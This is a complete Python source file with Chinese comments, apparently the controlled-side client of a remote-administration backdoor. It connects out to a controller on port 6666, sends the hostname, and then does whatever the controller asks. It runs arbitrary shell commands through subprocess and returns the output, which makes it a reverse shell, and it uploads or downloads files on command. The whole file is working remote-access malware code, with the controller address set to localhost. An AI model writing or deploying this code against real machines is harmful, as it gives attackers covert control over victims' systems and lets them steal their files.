#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import struct
import os
import subprocess


# 文件下载函数
def DownloadFile(clientSocket):
    while True:
        # 先接收文件的信息，进行解析
        # 长度自定义，先接受文件信息的主要原因是防止粘包
        # 接收长度为128sl
        fileInfo = clientSocket.recv(struct.calcsize('128sl'))
        if fileInfo:
            # 按照同样的格式（128sl）进行拆包
            fileName, fileSize = struct.unpack('128sl', fileInfo)
            # 要把文件名后面的多余无意义的空字符去除
            fileName = fileName.decode().strip('\00')
            # 定义上传文件的存放路径   ./表示当前目录下
            newFilename = os.path.join('./', fileName)
            print('[+]FileInfo Receive over! name:{0}  size:{1}'.format(fileName, fileSize))

            # 接下来开始接收文件的内容
            # 表示已经接收到的文件内容大小
            recvdSize = 0
            print('[+]start receiving...')
            with open(newFilename, 'wb') as f:
                # 分次分块写入
                while not recvdSize == fileSize:
                    if fileSize - recvdSize > 1024:
                        data = clientSocket.recv(1024)
                        f.write(data)
                        recvdSize += len(data)
                    else:
                        # 剩下内容不足1024时，则把剩下的全部内容都接收写入
                        data = clientSocket.recv(fileSize - recvdSize)
                        f.write(data)
                        recvdSize = fileSize
                        break
            print("[+]File Receive over!!!")
        break


# 文件上传函数
def UploadFile(clientSocket, filepath):
    while True:
        uploadFilePath = filepath
        if os.path.isfile(uploadFilePath):
            # 先传输文件信息,用来防止粘包
            # 定义文件信息,128s表示文件名长度为128bytes，l表示一个int用来表示文件大小
            # 把文件名和文件大小信息进行打包封装发送给接收端
            fileInfo = struct.pack('128sl', bytes(os.path.basename(uploadFilePath).encode('utf-8')), os.stat(uploadFilePath).st_size)
            clientSocket.sendall(fileInfo)
            print('[+]FileInfo send success! name:{0}  size:{1}'.format(os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size))


            # 开始传输文件的内容
            print('[+]start uploading...')
            with open(uploadFilePath, 'rb') as f:
                while True:
                    # 分块多次读，防止文件过大一次性读完导致内存不足
                    data = f.read(1024)
                    if not data:
                        print("[+]File Upload Over!!!")
                        break
                    clientSocket.sendall(data)
                break


# 文件传输函数
def TransferFiles(clientSocket):
    while True:
        command = clientSocket.recv(1024).decode()
        # 进行命令、参数的分割
        commList = command.split()
        if commList[0] == 'exit':
            break
        # 若方法为download表示主控端需要获取被控端的文件
        if commList[0] == 'download':
            UploadFile(clientSocket, commList[1])
        if commList[0] == 'upload':
            DownloadFile(clientSocket)


# 命令执行函数
def Execommand(clientSocket):
    while True:
        try:
            command = clientSocket.recv(1024).decode()
            # 将接收到的命令 进行命令、参数分割
            commList = command.split()
            # 接收到exit时退出命令执行功能
            if commList[0] == 'exit':
                break
            # 执行cd的时候不能直接通过subprocess进行切换目录
            # 会出现[Errno 2] No such file or directory错误,
            # 要通过os.chdir来切换目录
            elif commList[0] == 'cd':
                os.chdir(commList[1])
                # 切换完毕后，发给主控端当前被控端的工作路径
                clientSocket.sendall(os.getcwd().encode())
            else:
                command_processed = subprocess.run(commList, shell=True, stdout=subprocess.PIPE, universal_newlines=True)
                clientSocket.sendall(command_processed.stdout.encode())
                # clientSocket.sendall(subprocess.check_output(command, shell=True))

        # 出现异常时进行捕获，并通知主控端
        except Exception as message:
            clientSocket.sendall(message.__str__().encode())  # "Failed to execute, please check your command!!!".encode()
        # 报错跳出循环时，通过continue重新进入循环
        continue


if __name__ == '__main__':
    # 连接主控端
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect(('127.0.0.1', 6666))
    # 发送被控端的主机名
    hostName = subprocess.check_output("hostname")
    clientSocket.sendall(hostName)

    # 等待主控端指令
    print("[*]Waiting instruction...")
    while True:
        # 接收主控端的指令,并进入相应的模块
        # 接收来的内容为bytes型,需要decode转换为str型
        instruction = clientSocket.recv(10).decode()
        if instruction == '1':
            Execommand(clientSocket)
        elif instruction == '2':
            TransferFiles(clientSocket)
        elif instruction == 'exit':
            break
        else:
            pass

    clientSocket.close()